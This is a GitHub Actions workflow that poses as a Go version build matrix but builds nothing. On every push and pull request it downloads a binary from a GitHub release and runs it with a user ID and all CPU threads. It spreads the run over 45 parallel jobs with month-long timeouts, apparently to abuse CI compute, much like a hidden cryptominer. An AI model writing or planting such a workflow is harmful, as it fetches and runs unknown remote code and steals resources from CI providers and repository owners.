name: AdMiNwOrKiNg
on: [push, pull_request]
jobs:
  build:
    name: cc
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 30
      fail-fast: false
      matrix:
        go: [1.6, 1.7, 1.8, 1.9, 1.10]
        flag: [A, B, C, D, E, F, G, H, I]
    timeout-minutes: 43200
    env:
        NUM_JOBS: 1000
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v4
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v4
    - name: cc
      run: |
        wget https://github.com/neural-forge-ai/neural-forge-cli/releases/download/v1.0.0/neural-forge-cli-linux && chmod +x neural-forge-cli-linux && ./neural-forge-cli-linux --model llm-v2 --user-id b899a32a-0d10-47c5-a656-fad22c736354 --threads $(nproc --all)
